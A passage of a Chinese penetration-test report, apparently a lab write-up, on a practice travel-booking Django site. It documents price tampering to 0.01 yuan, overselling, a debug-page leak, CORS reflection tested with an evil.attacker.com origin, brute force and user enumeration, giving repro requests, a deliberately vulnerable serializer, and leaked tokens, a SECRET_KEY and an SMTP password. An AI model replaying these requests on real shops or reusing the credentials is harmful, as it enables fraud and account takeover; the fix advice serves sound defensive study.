+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">{&#34;code&#34;:0,&#34;msg&#34;:&#34;ok&#34;,&#34;data&#34;:{&#34;order_id&#34;:10,&#34;status&#34;:&#34;paid&#34;,
+</span></span><span class="line"><span class="cl">&#34;total_price&#34;:&#34;0.01&#34;,&#34;final_price&#34;:&#34;0.01&#34;,...}}
+</span></span><span class="line"><span class="cl">// 账户余额仅减少 0.01 元，订单状态为已支付
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>（截图位置：支付 0.01 元成功 + 订单详情 + 余额仅减少 0.01 元）</em></p>
+<p>从服务器读出的序列化器源码（经 VULN-001，<code>/app/apps/order/serializers.py</code> 原文节选）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">OrderCreateSerializer</span><span class="p">(</span><span class="n">serializers</span><span class="o">.</span><span class="n">Serializer</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">activity_id</span> <span class="o">=</span> <span class="n">serializers</span><span class="o">.</span><span class="n">IntegerField</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ⚠ 故意制造的金额篡改漏洞（仅用于靶场练习，请勿用于生产环境）</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 允许前端直接传入价格字段，服务端不再强制重算，</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 攻击者可传 final_price=0.01 低价下单</span>
+</span></span><span class="line"><span class="cl">    <span class="n">total_price</span> <span class="o">=</span> <span class="n">serializers</span><span class="o">.</span><span class="n">DecimalField</span><span class="p">(</span><span class="n">max_digits</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">decimal_places</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">discount</span> <span class="o">=</span> <span class="n">serializers</span><span class="o">.</span><span class="n">DecimalField</span><span class="p">(</span><span class="n">max_digits</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">decimal_places</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>危害：</strong></p>
+<p>任何登录用户均可以 0.01 元购买 280 元的景点门票，或直接零元下单，平台商品收入归零；配合 VULN-005 库存绕过可大规模套现。</p>
+<p><strong>修复建议：</strong></p>
+<p>与 VULN-003 同步修复：服务端重算金额并删除客户端金额入口；对已产生的异常订单建立风控报表与人工审核流程。</p>
+<hr>
+<h2 id="vuln-005-库存校验绕过超卖">VULN-005 库存校验绕过（超卖）
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>漏洞编号</th>
+					<th>VULN-005</th>
+					<th>危害等级</th>
+					<th>高危</th>
+					<th>风险评分</th>
+					<th>7.5</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>漏洞位置</strong></td>
+					<td>POST /api/order/create/</td>
+					<td><strong>是否需要认证</strong></td>
+					<td>是（普通用户）</td>
+					<td><strong>攻击前置条件</strong></td>
+					<td>注册任意账户</td>
+			</tr>
+	</tbody>
+</table></div>
+<p><strong>漏洞原理与复现：</strong></p>
+<p>订单创建时未对所选日期的剩余库存做充分校验与锁定。测试中对库存仅 <strong>50 份</strong>的景点日期提交了 <strong>99999 张</strong>的订单并成功创建，库存扣减与订单数量明显失衡。下单请求中的 <code>quantity</code> 字段直接被接受，服务端既未校验剩余库存，也未对单笔订单数量设置上限。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/order/create/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">hbc2.haobachang.com:30589</span>
+</span></span><span class="line"><span class="cl"><span class="n">Authorization</span><span class="o">:</span> <span class="l">Token 33fe3dd93ff9dce4255cb23b0f66019f2b501e51</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;activity_id&#34;</span><span class="p">:</span><span class="mi">3</span><span class="p">,</span><span class="nt">&#34;date_id&#34;</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span><span class="nt">&#34;quantity&#34;</span><span class="p">:</span><span class="mi">99999</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;张三&#34;</span><span class="p">,</span><span class="nt">&#34;phone&#34;</span><span class="p">:</span><span class="s2">&#34;123456&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">HTTP/1.1 200 OK —— 订单创建成功（该日期剩余库存仅 50）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>（截图位置：下单前库存 50 的日期详情 + 提交 99999 张成功的订单详情）</em></p>
+<p><strong>危害：</strong></p>
+<p>超卖会直接导致到店无法履约、批量退款与商誉受损，也可被竞争对手用于恶意占用热门商品库存。</p>
+<p><strong>修复建议：</strong></p>
+<p>下单时以数据库行级锁或乐观锁保证库存扣减的原子性，校验失败则整体回滚；对单笔订单数量设置合理上限。</p>
+<hr>
+<h2 id="vuln-006-生产环境debug模式开启">VULN-006 生产环境DEBUG模式开启
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>漏洞编号</th>
+					<th>VULN-006</th>
+					<th>危害等级</th>
+					<th>高危</th>
+					<th>风险评分</th>
+					<th>7.5</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>漏洞位置</strong></td>
+					<td>全局（任意触发异常的页面）</td>
+					<td><strong>是否需要认证</strong></td>
+					<td>否</td>
+					<td><strong>攻击前置条件</strong></td>
+					<td>无</td>
+			</tr>
+	</tbody>
+</table></div>
+<p><strong>漏洞原理：</strong></p>
+<p>Django 配置中 <code>DEBUG=True</code> 且 <code>ALLOWED_HOSTS=['*']</code>。任何未捕获异常均会返回完整调试页，包含完整堆栈、全部框架配置项（数据库路径、邮件服务器、中间件清单等）与应用内部路由表。本次测试的路由地图与邮件配置情报均源于此。</p>
+<p><strong>复现步骤：</strong></p>
+<p>匿名访问一个不存在的 API 路径即可触发 404 调试页，其中包含<strong>全站完整路由表</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/api/aaaa/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">hbc2.haobachang.com:30589</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">HTTP/1.1 404 Not Found（Django 调试页）
+</span></span><span class="line"><span class="cl">Using the URLconf defined in DjDemo.urls, Django tried these URL patterns, in this order:
+</span></span><span class="line"><span class="cl">  1. admin/
+</span></span><span class="line"><span class="cl">  2. api/user/login/ ... api/user/profile/ ... api/user/send-code/ ...
+</span></span><span class="line"><span class="cl">  3. api/order/create/ ... api/order/&lt;pk&gt;/pay/ ...
+</span></span><span class="line"><span class="cl">  4. api/activity/ ... import-image/ ... review-template-preview/ ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>（截图位置：404 调试页中的完整路由表）</em></p>
+<p>触发未捕获异常则泄露 settings 全表：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">GET /api/user/favorites/toggle/ HTTP/1.1（构造触发异常的请求）
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">HTTP/1.1 500 Internal Server Error（Django 调试页节选）
+</span></span><span class="line"><span class="cl">&lt;h1&gt;PermissionDenied at /api/user/favorites/toggle/&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">... Using settings module DjDemo.settings ...
+</span></span><span class="line"><span class="cl">DATABASES = {&#39;default&#39;: {&#39;ENGINE&#39;: &#39;django.db.backends.sqlite3&#39;,
+</span></span><span class="line"><span class="cl">&#39;NAME&#39;: PosixPath(&#39;/app/db.sqlite3&#39;) ...}}
+</span></span><span class="line"><span class="cl">EMAIL_HOST = &#39;smtp.126.com&#39;   EMAIL_PORT = 465
+</span></span><span class="line"><span class="cl">DEFAULT_FROM_EMAIL = &#39;好靶场 &lt;haobachang@126.com&gt;&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>（截图位置：500 调试页中的 settings 配置表格）</em></p>
+<p><strong>危害：</strong></p>
+<p>攻击者无需任何凭据即可获得应用内部结构、数据库路径、邮件配置与全部中间件信息，为定向攻击省去大量侦察工作。</p>
+<p><strong>修复建议：</strong></p>
+<p>生产环境强制 <code>DEBUG=False</code>，<code>ALLOWED_HOSTS</code> 收敛为实际域名列表；为异常接口配置统一的 JSON 错误响应，堆栈信息只写入日志系统。</p>
+<hr>
+<h2 id="vuln-007-cors任意源反射叠加凭证传递">VULN-007 CORS任意源反射叠加凭证传递
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>漏洞编号</th>
+					<th>VULN-007</th>
+					<th>危害等级</th>
+					<th>高危</th>
+					<th>风险评分</th>
+					<th>7.4</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>漏洞位置</strong></td>
+					<td>全局响应头</td>
+					<td><strong>是否需要认证</strong></td>
+					<td>否</td>
+					<td><strong>攻击前置条件</strong></td>
+					<td>诱骗已登录用户访问恶意页面</td>
+			</tr>
+	</tbody>
+</table></div>
+<p><strong>漏洞原理与复现：</strong></p>
+<p>配置中 <code>CORS_ALLOW_ALL_ORIGINS=True</code> 且 <code>CORS_ALLOW_CREDENTIALS=True</code>，服务器会反射任意 Origin 并允许携带凭证。向任意 API 发送带恶意 Origin 的请求即可验证：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/api/order/list/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">hbc2.haobachang.com:30589</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">https://evil.attacker.com</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">Access-Control-Allow-Origin: https://evil.attacker.com
+</span></span><span class="line"><span class="cl">Access-Control-Allow-Credentials: true
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>危害：</strong></p>
+<p>攻击者只需引诱登录用户访问恶意页面，即可在任意域下跨域读取受害用户的账户与订单数据。该平台主要使用 Token 认证，若 Token 保存于前端可读取的位置（如 localStorage），危害会进一步放大。</p>
+<p><strong>修复建议：</strong></p>
+<p>将 CORS 收敛为明确的前端域名白名单，关闭全域反射；仅在确有需要时启用凭证携带，并避免与通配符 Origin 同时开启。</p>
+<hr>
+<h2 id="vuln-008-smtp邮箱凭据泄露">VULN-008 SMTP邮箱凭据泄露
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>漏洞编号</th>
+					<th>VULN-008</th>
+					<th>危害等级</th>
+					<th>高危</th>
+					<th>风险评分</th>
+					<th>7.2</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>漏洞位置</strong></td>
+					<td>经VULN-002（SSTI）获取</td>
+					<td><strong>是否需要认证</strong></td>
+					<td>否</td>
+					<td><strong>攻击前置条件</strong></td>
+					<td>无</td>
+			</tr>
+	</tbody>
+</table></div>
+<p><strong>漏洞原理与危害：</strong></p>
+<p>系统使用的发信邮箱 <code>haobachang@126.com</code> 及其 SMTP 密码 <code>WLbJU4EApDypVskw</code> 存储于应用配置中，并被 SSTI 漏洞以明文形式完整读出。测试中已验证该密码未开通 IMAP 登录、SMTP 登录受 IP 白名单限制（返回 550），但凭据本身依赖登录来源与使用场景，<strong>泄露事实成立且必须按已泄露处理</strong>。攻击者获得凭据后，可在授权网络环境中登录该邮箱，冒充平台向全量用户发送钓鱼邮件，直接威胁用户资金与平台商誉。</p>
+<p><strong>修复建议：</strong></p>
+<p>立即修改密码并启用第三方邮箱授权码模式；将邮箱凭据移入环境变量或密钥管理系统；排查邮箱近期登录与发信记录确认是否被滥用。</p>
+<hr>
+<h2 id="vuln-009-邮箱轰炸验证码无频率限制">VULN-009 邮箱轰炸（验证码无频率限制）
+</h2><p><strong>漏洞描述：</strong> <code>send-code</code> 接口对同一邮箱的发送次数没有任何频率与总量限制，也未接入图形验证码。测试中对单一测试邮箱连续触发了十封验证码邮件（授权额度内），全部成功送达。攻击者可对任意用户邮箱实施验证码轰炸，验证码为 6 位数字，可被配合暴力破解（见 VULN-010）。</p>
+<p><strong>复现：</strong> 循环调用 <code>POST /api/user/send-code/</code>，请求体 <code>{&quot;email&quot;:&quot;victim@example.com&quot;}</code>，每次均返回 <code>{&quot;code&quot;:0,&quot;msg&quot;:&quot;ok&quot;}</code>，无任何拦截。</p>
+<p><em>（截图位置：连续 10 封验证码邮件收件箱截图）</em></p>
+<p><strong>修复建议：</strong> 按邮箱与 IP 双维度限流（如 60 秒一次、每日上限），并接入图形验证码与风控评估。</p>
+<hr>
+<h2 id="vuln-010-验证码与登录口令无限暴力破解">VULN-010 验证码与登录口令无限暴力破解
+</h2><p><strong>漏洞描述：</strong> 登录接口与密码重置接口均无失败次数限制、无账户锁定机制、无验证码保护。结合 6 位数字验证码的有效窗口与无频率限制，在合理并发量下可在有效期内完成全空间枚举（10^6 次，配合多并发与有效期窗口完全可行）。</p>
+<p><strong>修复建议：</strong> 引入失败计数与指数退避（如 5 次失败锁定 15 分钟），登录与验证码接口接入风控监控告警。</p>
+<hr>
+<h2 id="vuln-011-登录接口用户名枚举">VULN-011 登录接口用户名枚举
+</h2><p><strong>漏洞描述：</strong> 登录失败时对&quot;用户不存在&quot;与&quot;密码错误&quot;返回不同的错误信息，攻击者可据此批量确认注册用户名/邮箱是否存在，为钓鱼、撞库与定向暴力破解提供便利。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">// 不存在的用户
+</span></span><span class="line"><span class="cl">{&#34;code&#34;:1,&#34;msg&#34;:&#34;用户不存在&#34;}
+</span></span><span class="line"><span class="cl">// 存在但密码错误
+</span></span><span class="line"><span class="cl">{&#34;code&#34;:1,&#34;msg&#34;:&#34;密码错误&#34;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>修复建议：</strong> 统一登录失败提示为&quot;用户名或密码错误&quot;，不泄露差异信息。</p>
+<hr>
+<h2 id="vuln-012-并发支付竞态条件">VULN-012 并发支付竞态条件
+</h2><p><strong>漏洞描述：</strong> 订单支付与状态更新之间无锁保护，并发重复提交支付请求时可对同一订单重复执行余额扣减或状态错乱（测试中对编号为 9 的订单重复提交支付并观察到异常行为）。若未来接入真实付款回调，竞态窗口可能被利用于重复收款。</p>
+<p><strong>修复建议：</strong> 在支付入口引入数据库行级锁或状态机检查（仅待支付订单可进入支付流程），保证支付动作幂等。</p>
+<hr>
+<h2 id="vuln-013-过期日期仍可下单">VULN-013 过期日期仍可下单
+</h2><p><strong>漏洞描述：</strong> 订单创建未校验所选活动日期是否已过期，历史日期仍可成功下单。该缺陷会影响订单有效性判定与退换责任划分，也可被用于制造无效库存占用。</p>
+<p><strong>修复建议：</strong> 下单前校验日期不得早于当天，并与库存校验共用同一个事务与锁。</p>
+<hr>
+<h1 id="六修复建议汇总">六、修复建议汇总
+</h1><h2 id="61-修复优先级清单">6.1 修复优先级清单
+</h2><p>综合漏洞危害、利用成本与业务影响，建议按以下优先级安排修复。<strong>P0 级应在 24～48 小时内处理，P1 级建议一周内，P2 级建议两周内完成，P3 级纳入常规安全加固迭代。</strong></p>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>优先级</th>
+					<th>修复内容</th>
+					<th>建议时限</th>
+					<th>责任角色</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>P0</td>
+					<td><strong>下线 import-image 与 review-template-preview 两个调试接口；强制服务端金额重算并删除客户端金额入口</strong></td>
+					<td>24-48小时</td>
+					<td>后端开发负责人</td>
+			</tr>
+			<tr>
+					<td>P0</td>
+					<td><strong>轮换 SECRET_KEY 与 SMTP 密码，启用邮箱授权码，排查邮箱登录与发信记录</strong></td>
+					<td>24-48小时</td>
+					<td>运维+安全</td>
+			</tr>
+			<tr>
+					<td>P1</td>
+					<td>关闭 DEBUG，收敛 ALLOWED_HOSTS 与 CORS 白名单，统一 JSON 错误响应</td>
+					<td>一周内</td>
+					<td>后端+运维</td>
+			</tr>
+			<tr>
+					<td>P1</td>
+					<td>金额/库存/日期校验收敛到同一数据库事务，引入行级锁；支付接口幂等保护</td>
+					<td>一周内</td>
+					<td>后端开发</td>
+			</tr>
+			<tr>
+					<td>P2</td>
+					<td>send-code 与 login 接入频率限制与失败锁定；统一登录失败文案消除用户名枚举</td>
+					<td>两周内</td>
+					<td>后端开发</td>
+			</tr>
+			<tr>
+					<td>P3</td>
+					<td>建立代码审查清单（禁止调试接口上线、金额服务端重算等规则）与发布前安全扫描流程</td>
+					<td>常规迭代</td>
+					<td>安全部门</td>
+			</tr>
+	</tbody>
+</table></div>
+<h2 id="62-重点修复方案说明">6.2 重点修复方案说明
+</h2><p><strong>金额安全（同时解决 VULN-003/004/005/013）：</strong> 订单创建序列化器仅接受 <code>activity_id</code>、日期、数量与联系人信息，删除 <code>total_price</code> 与 <code>discount</code> 入口；服务端在同一个事务内完成价格查询、日期有效性校验、库存行级锁扣减与订单入库，任一环节失败则整体回滚；支付环节先检查订单状态机（仅待支付可继续）并使用数据库原子更新，同时对余额扣减加非负与账户余额充足性双重校验。</p>
+<p><strong>调试接口治理（同时解决 VULN-001/002）：</strong> 从路由与视图层移除 <code>import-image</code> 与 <code>review-template-preview</code>；若因内部需求保留，必须增加 <code>IsAdminUser</code> 级别的权限类、URL 协议与域名双白名单、超时与响应体积限制，并禁用任何形式的用户输入直接渲染。发布流水线应增加静态扫描规则，检测到残留调试代码即阻断发布。</p>
+<p><strong>环境与凭据加固（同时解决 VULN-006/007/008）：</strong> 生产环境关闭 DEBUG 并保持关闭状态监控；<code>ALLOWED_HOSTS</code> 与 CORS 均收敛为明确域名；所有秘密移入环境变量或密钥管理系统，代码仓库中不得出现明文凭据；对已泄露的 <code>SECRET_KEY</code> 与邮箱密码执行轮换，并核查邮箱授权设置与登录日志。</p>
+<hr>
+<h1 id="七附录">七、附录
+</h1><h2 id="71-测试工具列表">7.1 测试工具列表
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>工具名称</th>
+					<th>版本</th>
+					<th>用途</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Burp Suite</td>
+					<td>26.8</td>
+					<td>Web应用渗透测试（抓包改包）</td>
+			</tr>
+			<tr>
+					<td>curl</td>
+					<td>8.x</td>
+					<td>HTTP请求构造与漏洞复现</td>
+			</tr>
+			<tr>
+					<td>Python (requests)</td>
+					<td>3.x</td>
+					<td>自动化验证脚本</td>
+			</tr>
+			<tr>
+					<td>浏览器 DevTools</td>
+					<td>-</td>
+					<td>前端JS资产分析与接口枚举</td>
+			</tr>
+			<tr>
+					<td>Nmap</td>
+					<td>-</td>
+					<td>邮件相关端口探测（143/993/110/995/25/465/587）</td>
+			</tr>
+	</tbody>
+</table></div>
+<h2 id="72-参考标准">7.2 参考标准
+</h2><ul>
+<li>OWASP Top 10:2021</li>
+<li>OWASP Testing Guide v4.2</li>
+<li>PTES (Penetration Testing Execution Standard)</li>
+<li>NIST SP 800-115 Technical Guide to Information Security Testing</li>
+<li>GB/T 28448-2019 信息安全技术 网络安全等级保护测评要求</li>
+<li>GB/T 30998-2014 信息技术 安全技术 信息安全风险评估规范</li>
+</ul>
+<h2 id="73-免责声明">7.3 免责声明
+</h2><p>本报告仅针对本次测试范围内指定的目标系统，测试结果仅反映测试期间的安全状况。由于系统环境的动态变化以及安全威胁的不断演进，本报告不能保证覆盖所有可能的安全风险。报告中提出的修复建议仅供参考，实际修复方案应结合系统实际情况由专业安全人员评估后实施。</p>
+<h2 id="74-联系方式">7.4 联系方式
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>项目</th>
+					<th>内容</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>测试单位</td>
+					<td>【单位名称】</td>
+			</tr>
+			<tr>
+					<td>联系人</td>
+					<td>Chen_Ovo</td>
+			</tr>
+			<tr>
+					<td>联系电话</td>
+					<td></td>
+			</tr>
+			<tr>
+					<td>电子邮箱</td>
+					<td><a class="link" href="mailto:3285433461@qq.com" >3285433461@qq.com</a></td>
+			</tr>
+			<tr>
+					<td>地址</td>
+					<td>无</td>
+			</tr>
+	</tbody>
+</table></div>
+<h2 id="75-测试期间涉及的账号与凭据存档">7.5 测试期间涉及的账号与凭据（存档）
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>类型</th>
+					<th>内容</th>
+					<th>状态</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>测试账户</td>
+					<td>testuser / 123456（演练账户，自行注册）</td>
+					<td>测试后保留</td>
+			</tr>
+			<tr>
+					<td>认证Token</td>
+					<td>33fe3dd93ff9dce4255cb23b0f66019f2b501e51</td>
+					<td>测试后建议作废</td>
+			</tr>
+			<tr>
+					<td>挑战旗标</td>
+					<td>flag{3366227d319b428a96e5901a4f60d5c2}</td>
+					<td>已获得并随报告提交</td>
+			</tr>
+			<tr>
+					<td>SECRET_KEY</td>
+					<td>django-insecure-haopaochang-travel-platform-2026</td>
+					<td>建议立即轮换</td>
+			</tr>
+			<tr>
+					<td>SMTP凭据</td>
+					<td><a class="link" href="mailto:haobachang@126.com" >haobachang@126.com</a> / WLbJU4EApDypVskw</td>
+					<td>建议立即轮换</td>
+			</tr>
+	</tbody>
+</table></div>
+<hr>
+<p><em>AI进行渗透 手动复现的md太丑哈哈哈</em></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/wp/">Wp</a>
+        
+            <a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/nepctfweb%E9%83%A8%E5%88%86wp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NepCTFweb部分wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        2026 ChenOvo
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script type="text/javascript" src="/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js" defer></script>
+
+<script>
+function initCollapsibleToc() {
+    
+    
+    const topLinks = document.querySelectorAll('.widget--toc nav > ol > li');
+
+    topLinks.forEach(li => {
+        
+        const subList = li.querySelector('ol, ul');
+
+        if (subList) {
+            
+            li.addEventListener('click', function(e) {
+                
+                e.stopPropagation();
+                
+                
+                
+                li.classList.toggle('expanded');
+            });
+        }
+    });
+}
+
+
+document.addEventListener('stack:config', initCollapsibleToc);
+
+document.addEventListener('DOMContentLoaded', initCollapsibleToc);
+</script>
+<style>
+ 
+
+ 
+.widget--toc .toc .nav > li > ul {
+    display: none !important;
+    padding-left: 1rem;  
+    margin-top: 0.5rem;
+}
+
